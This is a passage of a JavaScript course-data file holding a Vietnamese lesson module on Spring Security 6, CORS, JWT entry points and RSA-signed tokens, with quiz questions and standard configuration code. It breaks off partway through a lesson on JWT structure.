window.COURSE_MODULES = window.COURSE_MODULES || [];
window.COURSE_MODULES.push(
{
  "id": 5,
  "title": "Security: JWT & Keycloak",
  "subtitle": "Spring Security 6, Stateless JWT, Keycloak SSO & BFF Pattern",
  "icon": "🔒",
  "desc": "Thiết lập bảo mật doanh nghiệp với Spring Security 6, Stateless JWT Token Rotation, OAuth2 Resource Server Keycloak và kiến trúc BFF.",
  "topics": [
    {
      "id": 1,
      "title": "Spring Security 6 & Filter Chain",
      "desc": "Kiến trúc SecurityFilterChain, AuthenticationManager, cơ chế Stateless và CORS/CSRF."
    },
    {
      "id": 2,
      "title": "Stateless JWT & Token Rotation",
      "desc": "Cấu trúc RFC 7519, ký số RSA/ECDSA, bảo mật Refresh Token Rotation và thu hồi qua Redis."
    },
    {
      "id": 3,
      "title": "OAuth2 Resource Server & Keycloak",
      "desc": "Tích hợp Identity Provider Keycloak, JWKS caching và ánh xạ phân quyền RBAC/ABAC."
    },
    {
      "id": 4,
      "title": "Advanced OAuth2, PKCE & BFF Pattern",
      "desc": "Authorization Code Flow với PKCE và kiến trúc Backend-For-Frontend bảo mật tuyệt đối."
    }
  ],
  "outcomes": [
    "Làm chủ kiến trúc Spring Security 6 với SecurityFilterChain cấu hình hoàn toàn bằng Lambda DSL",
    "Tự xây dựng hệ thống Stateless JWT với thuật toán Refresh Token Rotation an toàn",
    "Tích hợp OAuth2 Resource Server với Keycloak SSO xác thực tập trung quy mô doanh nghiệp",
    "Triển khai mô hình kiến trúc Backend-For-Frontend (BFF) loại bỏ hoàn toàn rủi ro rò rỉ Token qua XSS"
  ],
  "retrievalWarmup": [
    {
      "question": "Trong Module 4, tại sao việc sử dụng Testcontainers với Docker PostgreSQL thật lại được coi là tiêu chuẩn bắt buộc cho các bài test Integration tầng Professional?",
      "options": [
        "Vì nó bảo đảm môi trường kiểm thử giống hệt 100% môi trường Production (SQL dialect, Row-level lock, MVCC), phát hiện sớm lỗi Deadlock mà database in-memory H2 bỏ lọt",
        "Vì Testcontainers giúp giảm dung lượng RAM của máy dev xuống dưới 100MB",
        "Vì Testcontainers không cần cài đặt Docker Engine",
        "Vì H2 đã bị loại bỏ khỏi hệ sinh thái Spring Boot"
      ],
      "answer": 0,
      "explain": "H2 in-memory có cơ chế locking và type conversion rất khác biệt so với PostgreSQL/MySQL. Nhiều lỗi Concurrency, JSONB, Trigger hoặc Deadlock chỉ xuất hiện trên database thật, do đó CES-2026 cấm H2 ở bài thi cấp Professional.",
      "targetLessonId": "4-2-1"
    },
    {
      "question": "Khi kiểm thử một tác vụ bất đồng bộ (@Async hoặc Kafka Consumer), tại sao thư viện Awaitility lại vượt trội hơn Thread.sleep()?",
      "options": [
        "Awaitility liên tục polling kiểm tra điều kiện và cho bài test pass ngay khi điều kiện đạt được, tránh lãng phí thời gian và triệt tiêu lỗi Flaky Test",
        "Awaitility tự động sửa mã nguồn Java của Service",
        "Awaitility biến tác vụ bất đồng bộ thành đồng bộ cưỡng bức",
        "Awaitility chỉ chạy được trên môi trường Windows"
      ],
      "answer": 0,
      "explain": "Thread.sleep() buộc bài test phải chờ hết thời gian cố định và dễ fail nếu máy chủ CI quá tải. Awaitility poll liên tục với timeout linh hoạt, mang lại độ tin cậy tuyệt đối.",
      "targetLessonId": "4-3-1"
    },
    {
      "question": "Công cụ nào giúp lập trình viên viết các quy tắc kiểm soát kiến trúc Clean Architecture dưới dạng Unit Test để tự động gãy build nếu ai đó vi phạm ranh giới phân tầng?",
      "options": [
        "Thư viện ArchUnit",
        "Thư viện Lombok",
        "Plugin Maven Shade",
        "Thư viện Jackson"
      ],
      "answer": 0,
      "explain": "ArchUnit phân tích bytecode của các file .class và kiểm tra các ràng buộc kiến trúc (ví dụ: Controller không được gọi Repository), tự động gãy build khi có vi phạm.",
      "targetLessonId": "4-4-1"
    }
  ],
  "lessons": [
    {
      "id": "5-1-1",
      "type": "theory",
      "title": "Bài 5.1.1: Kiến trúc Spring Security 6, SecurityFilterChain & Cơ chế Ủy nhiệm Filter",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải mã cỗ máy cốt lõi của Spring Security 6: **DelegatingFilterProxy** và **FilterChainProxy**.\n- Hiểu tại sao trong Spring Security 6 (Spring Boot 3), class `WebSecurityConfigurerAdapter` đã bị khai tử hoàn toàn và thay thế bằng Bean `SecurityFilterChain`.\n- Nắm vững thứ tự thực thi của các Filter chuẩn: `CorsFilter` -> `CsrfFilter` -> `JwtAuthenticationFilter` -> `AuthorizationFilter`.\n- Đọc hiểu 100% từng dòng cấu hình Security qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: HỆ THỐNG CỔNG AN NINH SÂN BAY\n**Hình tượng \"Các trạm kiểm soát an ninh tại sân bay quốc tế\":**\n- Khách hàng (HTTP Request) muốn bước lên máy bay (Vào được Controller xử lý đơn hàng).\n- Trước khi vào cửa lên máy bay, hành khách phải đi qua một chuỗi các cửa kiểm soát an ninh tuần tự (**SecurityFilterChain**):\n  1. **Cổng 1 (CorsFilter)**: Kiểm tra hộ chiếu và quốc tịch — Khách từ trang web nào tới? Có được phép vào không?\n  2. **Cổng 2 (CsrfFilter)**: Soi chiếu hành lý — Có mang vũ khí độc hại giả mạo request không? (Với REST API Stateless thì tắt cổng này).\n  3. **Cổng 3 (JwtAuthenticationFilter)**: Quét thẻ căn cước / Vé máy bay — Xác định chính xác: *\"Bạn là ai? Danh tính của bạn là gì?\"* (Authentication).\n  4. **Cổng 4 (AuthorizationFilter)**: Kiểm tra hạng vé — Khách vé thường không được bước vào phòng chờ hạng thương gia (Authorization / Roles).\n- Nếu bất kỳ cổng nào từ chối, hành khách bị mời ra ngoài ngay lập tức (HTTP 401 hoặc 403)!\n:::\n\n---\n\n## 1. Cái này là gì? (Kiến trúc DelegatingFilterProxy & SecurityFilterChain)\n\nServlet Container (Tomcat) không hề biết Spring Bean là gì. Spring Security sử dụng **DelegatingFilterProxy** làm cầu nối ủy nhiệm toàn bộ việc lọc request từ Servlet Container sang cho **FilterChainProxy** (một Spring Bean quản lý danh sách các `SecurityFilterChain`).\n\n### Sơ Đồ Kiến Trúc: Chuỗi Lọc An Ninh SecurityFilterChain Trong Spring Boot 3\n\n```mermaid\nflowchart LR\n    A[\"HTTP Request từ Client\"] --> B[\"Servlet Container (Tomcat)\"]\n    B --> C[\"DelegatingFilterProxy<br/>(Cầu nối ủy nhiệm)\"]\n    C --> D[\"FilterChainProxy<br/>(Quản lý SecurityFilterChain)\"]\n    \n    subgraph CHAIN[\"SecurityFilterChain (Các trạm gác tuần tự)\"]\n        F1[\"CorsFilter\"] --> F2[\"CsrfFilter (Disabled)\"]\n        F2 --> F3[\"JwtAuthenticationFilter<br/>(Đọc Bearer Token & Nạp Context)\"]\n        F3 --> F4[\"AuthorizationFilter<br/>(Kiểm tra @PreAuthorize / Roles)\"]\n    end\n    \n    D --> CHAIN\n    F4 --> E[\"DispatcherServlet -> OrderController\"]\n    style CHAIN fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style C fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff\n```\n\n---\n\n## 2. Dùng khi nào & Tại sao? (Bối cảnh thực tế E-Commerce)\n\nKhi xây dựng kiến trúc REST API Stateless cho ứng dụng Web và Mobile trong hệ sinh thái thương mại điện tử:\n\n### Ma trận So sánh: Spring Security 5 cũ vs Spring Security 6 (Boot 3)\n\n| Tiêu chí | Spring Security 5 cũ | Spring Security 6 Chuẩn Mới (Boot 3) |\n|---|---|---|\n| **Cú pháp cấu hình** | Kế thừa `WebSecurityConfigurerAdapter` (Đã bị xóa bỏ) | Khai báo Component-based: `@Bean SecurityFilterChain` |\n| **Cấu hình Lambda DSL** | Dùng chuỗi phương thức `.and()` dài dòng, dễ nhầm | **100% Lambda DSL**: `authorizeHttpRequests(auth -> auth...)` |\n| **Cơ chế phân quyền** | `antMatchers()` và `authorizeRequests()` | Thay bằng **`requestMatchers()`** và **`authorizeHttpRequests()`** |\n| **Bộ lọc ủy nhiệm** | Dễ nhầm lẫn giữa URL matching của Servlet và Spring MVC | Tự động đồng bộ chuẩn mực với `MvcRequestMatcher` |\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nDưới đây là cấu hình `SecurityFilterChain` chuẩn mực của kỹ sư Senior:\n\n```java\npackage vn.mastery.ecommerce.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.Customizer;\nimport org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;\nimport org.springframework.security.config.http.SessionCreationPolicy;\nimport org.springframework.security.web.SecurityFilterChain;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport vn.mastery.ecommerce.security.JwtAuthenticationFilter;\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity // Kích hoạt @PreAuthorize(\"hasRole('ADMIN')\") trên Service/Controller\npublic class SecurityConfig {\n\n    private final JwtAuthenticationFilter jwtAuthFilter;\n\n    public SecurityConfig(JwtAuthenticationFilter jwtAuthFilter) {\n        this.jwtAuthFilter = jwtAuthFilter;\n    }\n\n    @Bean\n    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {\n        return http\n            // 1. Tắt CSRF vì REST API dùng JWT hoàn toàn Stateless\n            .csrf(AbstractHttpConfigurer::disable)\n            // 2. Kích hoạt cấu hình CORS theo chuẩn CorsConfigurationSource\n            .cors(Customizer.withDefaults())\n            // 3. ÉP BUỘC KHÔNG TẠO HTTPSESSION (Stateless)\n            .sessionManagement(session -> session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))\n            // 4. Phân quyền Endpoint\n            .authorizeHttpRequests(auth -> auth\n                .requestMatchers(\"/api/v1/auth/**\", \"/v3/api-docs/**\", \"/swagger-ui/**\").permitAll()\n                .requestMatchers(\"/api/v1/admin/**\").hasRole(\"ADMIN\")\n                .anyRequest().authenticated()\n            )\n            // 5. Chèn JwtAuthenticationFilter trước UsernamePasswordAuthenticationFilter\n            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)\n            .build();\n    }\n}\n```\n\n### Bảng Giải Mã Các Thành Phần Cốt Lõi:\n\n| Cú pháp cấu hình | Ý nghĩa kỹ thuật | Tác động an ninh |\n|---|---|---|\n| `csrf(AbstractHttpConfigurer::disable)` | Tắt bộ lọc CSRF Token | An toàn cho REST API vì client không dùng Cookie Session của trình duyệt |\n| `SessionCreationPolicy.STATELESS` | Cấm tạo và lưu HttpSession | Server không lưu trạng thái đăng nhập, cho phép scale ngang hàng nghìn Pod trên Kubernetes |\n| `.addFilterBefore(jwtFilter, ...)` | Chèn Filter tùy chỉnh vào chuỗi | Đọc và giải mã JWT token trước khi hệ thống xác thực mặc định kiểm tra |\n| `@EnableMethodSecurity` | Kích hoạt bảo mật cấp phương thức | Cho phép bảo vệ từng method cụ thể: `@PreAuthorize(\"hasRole('ADMIN')\")` |\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Hiểm họa quên bật `SessionCreationPolicy.STATELESS`**:\n   - Nếu bạn không cấu hình dòng này, Spring Security sẽ **tự động tạo một `JSESSIONID` cookie** sau lần đăng nhập đầu tiên!\n   - Kết quả: Khi user gửi request tiếp theo mà không kèm JWT, Spring vẫn nhận ra user thông qua Session Cookie cũ trong RAM máy chủ! Ứng dụng bị biến thành Stateful ngoài ý muốn!\n"
    },
    {
      "id": "5-1-2",
      "type": "practice",
      "title": "Bài 5.1.2: Cấu hình SecurityFilterChain Stateless, CORS Chuẩn & Vô hiệu hóa CSRF",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải quyết dứt điểm lỗi kinh điển khiến 90% lập trình viên frontend đau đầu: **CORS Policy (Cross-Origin Resource Sharing)**.\n- Hiểu bản chất yêu cầu kiểm tra trước **HTTP OPTIONS Preflight Request** của trình duyệt.\n- Tự tay cấu hình `CorsConfigurationSource` chuẩn chỉ cho phép Frontend React/Next.js gọi API.\n- Đọc hiểu 100% từng dòng cấu hình CORS qua Bảng giải mã chi tiết.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: CORS VÀ HTTP OPTIONS PREFLIGHT\n**Hình tượng \"Người đưa thư lịch sự hỏi trước khi giao kiện hàng lớn\":**\n- Trình duyệt Chrome của người dùng đang mở trang web `https://shopee-frontend.com`.\n- Trang web này muốn gọi API lấy danh sách đơn hàng từ server `https://api-backend.com` (Hai tên miền khác nhau hoàn toàn -> Cross-Origin).\n- **Trình duyệt rất cảnh giác**: *\"Tôi không biết anh Backend kia có đồng ý cho trang web Shopee này gọi hay không!\"*.\n- Trước khi gửi request thật (`POST /api/orders`), trình duyệt **tự động gửi một yêu cầu thăm dò trước gọi là HTTP OPTIONS (Preflight Request)**:\n  - *\"Này Backend, tôi chuẩn bị gửi request kèm Header Authorization, anh có cho phép không?\"*.\n  - Nếu Backend trả về **HTTP 200 OK kèm Header `Access-Control-Allow-Origin`**: Trình duyệt mới cho phép gửi tiếp request thật.\n  - Nếu Backend chặn lại hoặc trả về 403 Forbidden: Trình duyệt lập tức báo lỗi đỏ lòm trên Console: **CORS Blocked**!\n:::\n\n---\n\n## 1. Cái này là gì? (Cơ Chế Vận Hành HTTP OPTIONS Preflight)\n\nCORS không phải là một lỗi của Backend, mà là **cơ chế bảo mật của Trình duyệt (Browser Security)** ngăn chặn các trang web độc hại lén lút gọi API đến các dịch vụ nhạy cảm của người dùng.\n\n### Sơ Đồ Cơ Chế: 2 Bước Giao Tiếp Của Trình Duyệt Với CORS Preflight:\n\n```mermaid\nsequenceDiagram\n    participant Browser as Web Browser (React Frontend)\n    participant Spring as Spring Boot SecurityFilterChain\n    \n    Note over Browser: Bước 1: Trình duyệt gửi Preflight tự động\n    Browser->>Spring: OPTIONS /api/v1/orders (Access-Control-Request-Method: POST)\n    Spring-->>Browser: HTTP 200 OK (Access-Control-Allow-Origin: https://frontend.com)\n    \n    Note over Browser: Bước 2: Preflight thành công -> Gửi Request thật\n    Browser->>Spring: POST /api/v1/orders (Kèm Bearer JWT Token)\n    Spring-->>Browser: HTTP 201 Created (Tạo đơn thành công)\n```\n\n---\n\n## 2. Dùng khi nào & Tại sao? (Cấu Hình Chuẩn Sản Xuất)\n\n### Ma trận So sánh: Cấu hình `@CrossOrigin` vs `CorsConfigurationSource`\n\n| Tiêu chí | Dùng `@CrossOrigin` trên Controller | Cấu hình `CorsConfigurationSource` tập trung |\n|---|---|---|\n| **Vị trí áp dụng** | Rải rác trên từng Controller class / method | **Tập trung 1 nơi duy nhất** tại `SecurityConfig` |\n| **Xử lý Preflight OPTIONS** | Thường bị Spring Security chặn trước khi tới được Controller | **Xử lý ngay tại đầu Filter Chain (CorsFilter)** |\n| **Bảo trì môi trường** | Khó đổi danh sách allowed origins giữa dev/prod | Nạp từ biến môi trường `application.yml` dễ dàng |\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nCấu hình Bean `CorsConfigurationSource` chuẩn mực cho hệ thống E-Commerce:\n\n```java\npackage vn.mastery.ecommerce.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.cors.CorsConfiguration;\nimport org.springframework.web.cors.CorsConfigurationSource;\nimport org.springframework.web.cors.UrlBasedCorsConfigurationSource;\nimport java.util.List;\n\n@Configuration\npublic class CorsConfig {\n\n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration config = new CorsConfiguration();\n\n        // 1. Cho phép các domain Frontend được chỉ định gọi vào\n        config.setAllowedOrigins(List.of(\n            \"http://localhost:3000\",      // Next.js Local Dev\n            \"https://ecommerce.mastery.vn\" // Production Domain\n        ));\n\n        // 2. Cho phép các HTTP Methods\n        config.setAllowedMethods(List.of(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\", \"OPTIONS\"));\n\n        // 3. Cho phép các Headers cần thiết\n        config.setAllowedHeaders(List.of(\"Authorization\", \"Content-Type\", \"Accept\", \"X-Requested-With\"));\n\n        // 4. Cho phép gửi kèm Credentials (Cookie/Auth)\n        config.setAllowCredentials(true);\n\n        // 5. Cache kết quả Preflight trong 1 giờ để trình duyệt không phải gửi OPTIONS liên tục\n        config.setMaxAge(3600L);\n\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", config); // Áp dụng cho toàn bộ API\n        return source;\n    }\n}\n```\n\n### Bảng Giải Mã Các Thiết Lập CORS:\n\n| Thiết lập | Giá trị | Ý nghĩa an ninh |\n|---|---|---|\n| `setAllowedOrigins` | Danh sách domain cụ thể | Tuyệt đối không dùng dấu sao (`*`) khi đã bật `setAllowCredentials(true)` |\n| `setMaxAge(3600L)` | 1 giờ | Trình duyệt chỉ cần hỏi preflight 1 lần mỗi giờ, giảm 50% số lượng request lên server |\n| `registerCorsConfiguration(\"/**\", ...)` | Áp dụng toàn cục | Đảm bảo cả các endpoint Swagger, Auth và Order đều tuân thủ |\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Lỗi đụng độ giữa `allowedOrigins = \"*\"` và `allowCredentials = true`**:\n   - Chuẩn bảo mật W3C quy định: **Nếu cho phép gửi thông tin định danh (Credentials: true) thì TUYỆT ĐỐI KHÔNG ĐƯỢC dùng wildcard (`*`) cho Origin**.\n   - Nếu bạn cấu hình cả 2 điều này, trình duyệt sẽ chặn request ngay lập tức!\n   - Khắc phục: Liệt kê danh sách domain rõ ràng hoặc dùng `setAllowedOriginPatterns(List.of(\"https://*.mastery.vn\"))`.\n"
    },
    {
      "id": "5-1-3",
      "type": "pitfall",
      "title": "Bài 5.1.3: Cạm bẫy Bật Session Trong REST API, Lỗi CORS Preflight 403 & AntMatcher Sai",
      "minutes": 7,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải mã nguyên nhân tại sao yêu cầu HTTP OPTIONS Preflight lại bị Spring Security trả về lỗi **HTTP 403 Forbidden**.\n- Nắm vững cách Spring Security 6 xử lý `CorsFilter` đứng trước toàn bộ các Filter kiểm tra xác thực.\n- Khắc phục lỗi cấu hình sai đường dẫn `requestMatchers` khiến các endpoint công khai (Public API) bị khóa nhầm.\n- Đọc hiểu bảng phân tích triệu chứng lỗi và cách khắc phục chuẩn Senior.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TẠI SAO PREFLIGHT BỊ 403 FORBIDDEN?\n**Hình tượng \"Người hỏi đường bị cảnh sát bắt vì không có vé\":**\n- Yêu cầu Preflight `OPTIONS` của trình duyệt chỉ là một câu hỏi thăm dò: *\"Cho tôi hỏi cổng này có mở không?\"*.\n- Vì chỉ là câu hỏi thăm dò, trình duyệt **hoàn toàn KHÔNG đính kèm Bearer Token JWT**!\n- Nếu cấu hình bảo mật của bạn đặt cổng kiểm tra vé (`AuthorizationFilter`) **đứng trước cổng trả lời câu hỏi**:\n- Cảnh sát nhìn thấy request không có token -> Lập tức quát: *\"Không có vé, cấm vào!\"* và ném về mã **HTTP 403**!\n- Trình duyệt thấy 403 liền hủy luôn cả request thật -> Frontend gãy hoàn toàn!\n- **Giải pháp**: Cổng CORS phải luôn đứng ở **vị trí số 1** để trả lời câu hỏi trước khi kiểm tra vé!\n:::\n\n---\n\n## 1. Cái này là gì? (Bản chất Vị Trí Của CorsFilter)\n\nTrong Spring Security, nếu không kích hoạt `.cors(Customizer.withDefaults())` đúng cách trong `SecurityFilterChain`, `CorsFilter` sẽ không được tích hợp vào chuỗi lọc an ninh. Kết quả là các request HTTP OPTIONS sẽ bị chuyển xuống cho các Filter phía sau kiểm tra và bị từ chối vì thiếu Authentication.\n\n### Sơ Đồ Khắc Phục Lỗi CORS Preflight 403:\n\n```mermaid\nflowchart TD\n    A[\"Trình duyệt gửi OPTIONS Preflight (Không có Token)\"] --> B{\"Vị trí CorsFilter\"}\n    B -->|\"Cấu hình SAI: Không kích hoạt http.cors()\"| C[\"Request trôi xuống AuthorizationFilter\"]\n    C --> ERR[\"BÁO LỖI 403 FORBIDDEN!<br/>(Do không có JWT Token)\"]\n    \n    B -->|\"Cấu hình ĐÚNG: http.cors(Customizer.withDefaults())\"| D[\"CorsFilter ở vị trí số 1\"]\n    D --> OK[\"Phản hồi ngay HTTP 200 OK + CORS Headers!<br/>(Không cần kiểm tra Token)\"]\n    style OK fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style ERR fill:#7f1d1d,stroke:#ef4444,stroke-width:2px,color:#fff\n```\n\n---\n\n## 2. Dùng khi nào & Tại sao? (Quy Tắc Matcher Trong Spring Security 6)\n\n### Ma trận So sánh: Cú pháp matcher cũ vs mới\n\n| Cú pháp cũ (Spring Boot 2) | Cú pháp mới (Spring Boot 3) | Lỗi hay gặp |\n|---|---|---|\n| `antMatchers(\"/auth/**\")` | **`requestMatchers(\"/auth/**\")`** | Không hỗ trợ trên Spring Boot 3 |\n| `regexMatchers(\"...\")` | **`requestMatchers(RegexRequestMatcher...)`** | Cần import đúng class matcher |\n| Tự phân tách HTTP Method rời | `requestMatchers(HttpMethod.POST, \"/orders\")` | Áp dụng chính xác cho từng phương thức |\n\n---\n\n## 3. Dùng như thế nào & Phân tích từng dòng code (How-to & Line-by-line Breakdown)\n\nCấu hình xử lý ngoại lệ AuthenticationEntryPoint để trả về JSON chuẩn RFC 7807 thay vì trang login HTML:\n\n```java\npackage vn.mastery.ecommerce.security;\n\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport org.springframework.http.HttpStatus;\nimport org.springframework.http.MediaType;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.AuthenticationEntryPoint;\nimport org.springframework.stereotype.Component;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.util.Map;\n\n@Component\npublic class JwtAuthenticationEntryPoint implements AuthenticationEntryPoint {\n\n    private final ObjectMapper objectMapper = new ObjectMapper();\n\n    @Override\n    public void commence(HttpServletRequest request, HttpServletResponse response,\n                         AuthenticationException authException) throws IOException {\n        // Trả về JSON ProblemDetails chuẩn hóa khi token không hợp lệ hoặc thiếu token\n        response.setStatus(HttpStatus.UNAUTHORIZED.value());\n        response.setContentType(MediaType.APPLICATION_PROBLEM_JSON_VALUE);\n\n        Map<String, Object> body = Map.of(\n            \"type\", URI.create(\"https://ecommerce.mastery.vn/errors/unauthorized\"),\n            \"title\", \"Yêu cầu không được xác thực\",\n            \"status\", HttpStatus.UNAUTHORIZED.value(),\n            \"detail\", authException.getMessage(),\n            \"instance\", request.getRequestURI()\n        );\n\n        objectMapper.writeValue(response.getOutputStream(), body);\n    }\n}\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Luôn đăng ký `AuthenticationEntryPoint` trong SecurityConfig**:\n   - Nếu bạn quên đăng ký entry point này: Khi khách gửi token sai, Spring Security mặc định sẽ chuyển hướng (Redirect 302) về trang `/login` HTML của ứng dụng web truyền thống!\n   - Đăng ký bằng: `http.exceptionHandling(ex -> ex.authenticationEntryPoint(jwtAuthenticationEntryPoint))`.\n"
    },
    {
      "id": "5-1-4",
      "type": "synthesis",
      "title": "Bài 5.1.4: Tổng Kết Thực Chiến: Bản Đồ SecurityFilterChain & Ma Trận Luồng Xác Thực Spring Security 6",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Tổng hợp toàn bộ kiến thức Chuyên đề 5.1 thành Bản đồ kiến trúc chuỗi lọc an ninh hoàn chỉnh.\n- Nắm chắc thứ tự xử lý của 12 Filter tiêu chuẩn bên trong `SecurityFilterChain`.\n- Sẵn sàng bước sang Chuyên đề 5.2 (Stateless JWT, Ký số RSA & Refresh Token Rotation).\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: TỔNG KẾT HỆ THỐNG AN NINH\nBạn vừa thiết lập xong \"Hàng rào phòng thủ đầu tiên\" của hệ thống Spring Boot:\n- Cổng CORS đã mở đúng hướng cho phép Frontend bước vào.\n- Cánh cửa CSRF nguy hiểm đã được vô hiệu hóa an toàn cho kiến trúc REST API.\n- Toàn bộ cơ chế tạo Session cồng kềnh trong RAM đã bị tắt sạch, nhường chỗ cho kỷ nguyên **Stateless Token**.\nBây giờ, chúng ta sẽ bắt tay vào việc phát hành những chiếc \"Hộ chiếu số vạn năng\": **JSON Web Token (JWT)!**\n:::\n\n---\n\n## 1. Cái này là gì? (Bản Đồ Kiến Trúc SecurityFilterChain Hoàn Chỉnh)\n\n### Sơ Đồ Luồng: 12 Bước Thực Thi Chi Tiết Của Một HTTP Request Qua Spring Security:\n\n```mermaid\nflowchart TD\n    A[\"Client Request\"] --> B[\"1. CorsFilter (Kiểm tra Origin)\"]\n    B --> C[\"2. CsrfFilter (Bypass nếu tắt)\"]\n    C --> D[\"3. SecurityContextHolderFilter (Nạp Context rỗng)\"]\n    D --> E[\"4. HeaderWriterFilter (Chèn HSTS, X-Content-Type)\"]\n    E --> F[\"5. LogoutFilter (Bắt endpoint /logout)\"]\n    F --> G[\"6. JwtAuthenticationFilter (TỰ VIẾT: Giải mã JWT)\"]\n    G --> H[\"7. UsernamePasswordAuthenticationFilter\"]\n    H --> I[\"8. SecurityContextHolderAwareRequestFilter\"]\n    I --> J[\"9. AnonymousAuthenticationFilter (Gán Anonymous nếu chưa login)\"]\n    J --> K[\"10. ExceptionTranslationFilter (Bắt lỗi 401/403)\"]\n    K --> L[\"11. AuthorizationFilter (Kiểm tra quyền cuối cùng)\"]\n    L --> M[\"12. Đi vào Controller xử lý nghiệp vụ!\"]\n    style G fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#fff\n    style L fill:#1e3a8a,stroke:#3b82f6,stroke-width:2px,color:#fff\n```\n\n---\n\n## 4. Cạm bẫy thực tế & Best Practices\n\n1. **Checklist tốt nghiệp Chuyên đề 5.1**:\n   - [ ] Đã tắt hoàn toàn `csrf()`.\n   - [ ] Đã kích hoạt `sessionCreationPolicy(SessionCreationPolicy.STATELESS)`.\n   - [ ] Đã cấu hình `CorsConfigurationSource` chuẩn chỉ.\n   - [ ] Đã đăng ký `AuthenticationEntryPoint` trả về JSON RFC 7807.\n\n\n\n### Ma Trận Chuỗi Lọc Tiêu Chuẩn Trong SecurityFilterChain:\n\n| Thứ tự bộ lọc | Tên Filter kỹ thuật | Nhiệm vụ chính | Hành động khi vi phạm |\n|---|---|---|---|\n| **1** | `CorsFilter` | Kiểm tra nguồn gốc HTTP Header `Origin` | Từ chối ngay nếu domain không nằm trong Whitelist |\n| **2** | `HeaderWriterFilter` | Ghi các Header phòng vệ (X-Content-Type, HSTS) | Luôn gắn Header an toàn vào Response |\n| **3** | `CsrfFilter` | Kiểm tra mã Token chống giả mạo request | Vô hiệu hóa (`csrf.disable()`) đối với Stateless JWT API |\n| **4** | `BearerTokenAuthenticationFilter` | Trích xuất chuỗi JWT từ Header `Authorization` | Nếu thiếu hoặc sai định dạng: Chuyển tiếp Request ẩn danh |\n| **5** | `ExceptionTranslationFilter` | Đón bắt ngoại lệ an ninh (Authentication/AccessDenied) | Chuyển thành HTTP 401 Unauthorized hoặc 403 Forbidden |\n| **6** | `AuthorizationFilter` | Kiểm tra quyền hạn cuối cùng (`hasRole`, `authenticated`) | Ném `AccessDeniedException` nếu User thiếu quyền |\n"
    },
    {
      "id": "5-2-1",
      "type": "theory",
      "title": "Bài 5.2.1: Cấu trúc Kỹ thuật JWT (RFC 7519), Ký số Bất đối xứng RSA & Refresh Token Rotation",
      "minutes": 8,
      "content": "\n:::target 🎯 MỤC TIÊU BÀI HỌC (10 PHÚT)\n- Giải phẫu cấu trúc 3 phần chuẩn hóa của JSON Web Token (RFC 7519): **Header**, **Payload** và **Signature**.\n- So sánh sự khác nhau giữa ký số đối xứng (HMAC-SHA256) và ký số bất đối xứng (RSA / ECDSA).\n- Hiểu tại sao trong kiến trúc Microservices phân tán, **RSA Public/Private Key** là lựa chọn Senior bắt buộc.\n- Nắm vững cơ chế bảo mật tối thượng: **Refresh Token Rotation (RTR)** chống trộm cắp token.\n:::\n\n:::beginner 💡 GÓC GIẢI THÍCH TRỰC QUAN: JWT VÀ CƠ CHẾ KÝ SỐ BẤT ĐỐI XỨNG\n**1. JWT là gì? — \"Tấm bằng lái xe có tem chống giả\":**\n- Bạn nộp hồ sơ thi bằng lái một lần duy nhất tại Sở Giao Thông (**Auth Service**).\n- Sở cấp cho bạn một tấm bằng lái (**JWT Token**). Trên bằng ghi rõ: Tên, Ngày sinh, Hạng bằng lái B2 (**Payload**).\n- Cuối tấm bằng có con dấu nổi của giám đốc Sở (**Signature - Chữ ký số**).\n- Khi bạn lái xe trên đường: Cảnh sát giao thông ở bất kỳ tỉnh thành nào (**Order Service, Payment Service**) chỉ cần nhìn vào con dấu để biết bằng thật hay giả, **hoàn toàn không cần gọi điện thoại về trụ sở để hỏi lại**!\n\n**2. Ký số RSA — \"Chìa khóa riêng để ký, Chìa khóa chung để kiểm tra\":**\n- **Private Key (Chìa khóa bí mật)**: Chỉ một mình Auth Service nắm giữ trong két sắt để ký bằng lái.\n- **Public Key (Chìa khóa công 